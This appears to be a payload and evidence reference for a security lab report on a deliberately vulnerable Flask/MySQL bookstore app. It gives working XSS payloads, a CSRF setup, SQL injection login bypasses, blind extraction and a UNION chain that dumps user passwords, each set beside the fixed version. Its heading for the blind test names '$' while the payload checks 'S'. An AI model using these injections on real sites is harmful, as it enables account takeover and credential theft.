# Payload & Evidence Reference — BookNest (Python/Flask + MySQL)

All payloads below are confirmed working against the vulnerable app
(`localhost:5000`) and confirmed **blocked** against the safe app
(`localhost:5001`), using the seed accounts from the README. Use this as
the source for the "payload + screenshot" section of the report — take
the screenshot yourself in the browser, matching these exact steps.

---

## 1. XSS — Reflected

**Where:** search box / `GET /search?q=`

**Steps:**
1. Go to `http://localhost:5000/search?q=<script>alert('reflected-xss')</script>`
   (or type it into the search box).
2. An alert box pops up immediately — the payload came straight from the
   URL and was never stored anywhere.

**Payload:**
```
<script>alert('reflected-xss')</script>
```

**Safe version:** same URL against `localhost:5001` — no alert; the page
shows the payload as literal text.

---

## 2. XSS — Stored

**Where:** book review form, any book page, e.g. `http://localhost:5000/book/1`

**Steps:**
1. Log in (e.g. `alice` / `alice123`).
2. On a book's page, submit a review with the payload below as the comment.
3. The alert fires immediately on submit, **and fires again for every
   other visitor** who later opens that same book page.

**Payload:**
```
<script>alert('stored-xss')</script>
```

**Safe version:** same steps against `localhost:5001` — the review saves
fine, but is displayed as literal text, no alert.

---

## 3. XSS — DOM-based

**Where:** the "quick note" banner at the top of every page
(`static/js/quicknote.js`), driven purely by the URL hash — never sent to
the server.

**Steps:**
```
http://localhost:5000/#note=<img src=x onerror=alert('dom-xss')>
```
The alert fires as soon as the page's JS runs. Open DevTools Network tab
if you want to additionally show that `note=...` never appears in any
outgoing request, proving the bug is 100% client-side.

**Safe version:** same URL against `localhost:5001` — the banner shows
the literal text, no alert (fix: `.textContent` instead of `.innerHTML`).

---

## 4. CSRF

**Where:** `/profile/update-email`, attacked via `csrf_attack/evil.html`.

**Steps:**
1. Log into the vulnerable app as `alice` at `http://localhost:5000/login`.
2. Without logging out, open `csrf_attack/evil.html` in the same browser.
3. Go to `http://localhost:5000/profile` — the email has silently changed
   to `attacker-controlled@evil.com`.

**Safe version:** repeat with the form's `action` in `evil.html` pointed
at `localhost:5001` — rejected with `405 Method Not Allowed` (the route
is POST-only now); a forged `POST` without the right token would get
`403 Forbidden` instead. Either way, email unchanged.

---

## 5. SQL Injection — Easy (login bypass)

**Where:** `POST /login`

**Steps:** On `http://localhost:5000/login`, log in with:
- Username: `admin' -- `
- Password: *(anything)*

This logs you straight into the `admin` account with no valid password.

**What it does to the query:**
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
```

**Alternative generic bypass** (logs into whichever account comes first):
- Username: `' OR '1'='1' -- `
- Password: *(anything)*

**Safe version:** same payloads on `localhost:5001` just show "Invalid
username or password" — the username is looked up with a parameterized
query, and the password is checked with `check_password_hash()`, never
compared inside SQL.

---

## 6. SQL Injection — Intermediate (blind boolean / error-based)

**Where:** `GET /api/check-email` (the live "is this email taken?" check
on the registration page). It only ever answers `{"status":"taken"}` or
`{"status":"available"}`.

**Boolean-blind — confirm the first character of admin's password hash is `$`:**

> Note: the vulnerable DB stores plaintext passwords, so this still
> recovers the real password character by character, same as the easy
> login example — this endpoint is just a different, blind injection
> point into the same `users` table.

```
GET /api/check-email?email=x' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='S'-- -
```
Response: `{"status":"taken"}` → **true**, first character is `S`.

**Same payload with a wrong guess (`Z`):**
```
GET /api/check-email?email=x' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='Z'-- -
```
Response: `{"status":"available"}` → **false**. Repeating this for each
position recovers the whole password one character at a time.

**Error-based variant** — an unbalanced quote surfaces the raw MySQL
error message in the JSON response:
```
GET /api/check-email?email=x'
```

**Safe version:** every one of the above against `localhost:5001` returns
`{"status":"available"}` regardless of the condition, and errors are
never leaked to the client.

---

## 7. SQL Injection — Advanced (full UNION-based chain via `information_schema`)

**Where:** `GET /search?q=` (the same field used for reflected XSS above
— one field, two independent, separately-fixed vulnerabilities).

### Stage 1 — find the number of columns
```
http://localhost:5000/search?q=zzz' ORDER BY 4-- -
http://localhost:5000/search?q=zzz' ORDER BY 5-- -
```
`ORDER BY 4` returns normally; `ORDER BY 5` throws an "Unknown column '5'
in 'order clause'" error → **the query returns 4 columns.**

### Stage 2 — confirm which columns are reflected on the page
```
http://localhost:5000/search?q=zzz' UNION SELECT 1,2,3,4-- -
```
The results table shows a row with `1 | 2 | 3 | 4`.

### Stage 3 — enumerate table names (`information_schema.tables`)
```
http://localhost:5000/search?q=zzz' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=DATABASE()-- -
```
Result (in the Title column): `books,reviews,users`

### Stage 4 — enumerate the columns of the `users` table (`information_schema.columns`)
```
http://localhost:5000/search?q=zzz' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='users' AND table_schema=DATABASE()-- -
```
Result: `id,username,email,password,is_admin`

> **Important:** `information_schema.columns` lists columns from *every*
> database on the server, not just the current one. Without
> `AND table_schema=DATABASE()`, this lab's query returns the `users`
> columns twice (once from `booknest_vulnerable`, once from
> `booknest_safe`, since both happen to have a same-named table) — a
> good real-world reminder that a careless advanced SQLi payload can
> itself produce misleading noise if it isn't scoped correctly.

### Stage 5 — extract the actual sensitive data
```
http://localhost:5000/search?q=zzz' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR ' | '),3,4 FROM users-- -
```
Result: `alice:alice123 | bob:bob123 | admin:SuperSecretAdmin!2026`

(`0x3a` is the hex literal for `:` — a common way to embed a separator
without fighting quote-escaping; `CONCAT(username,':',password)` works
identically if you prefer.)

**All five stages at once (URL-encoded `q` values)**, for convenience:

| Stage | `q` value |
|---|---|
| 1 | `zzz' ORDER BY 4-- -` |
| 2 | `zzz' UNION SELECT 1,2,3,4-- -` |
| 3 | `zzz' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=DATABASE()-- -` |
| 4 | `zzz' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='users' AND table_schema=DATABASE()-- -` |
| 5 | `zzz' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR ' \| '),3,4 FROM users-- -` |

**Safe version:** every one of the five stages against `localhost:5001`
returns "No books found." — the `LIKE %s` query is parameterized, so
none of this input can ever change the SQL structure.

---

## Quick reference: all payloads in one place

```text
Reflected XSS:     <script>alert('reflected-xss')</script>
Stored XSS:        <script>alert('stored-xss')</script>
DOM-based XSS:     #note=<img src=x onerror=alert('dom-xss')>
CSRF:              csrf_attack/evil.html (auto-submits GET /profile/update-email)
SQLi easy:         admin' -- 
SQLi intermediate: x' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='S'-- -
SQLi advanced:     zzz' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR ' | '),3,4 FROM users-- -
```
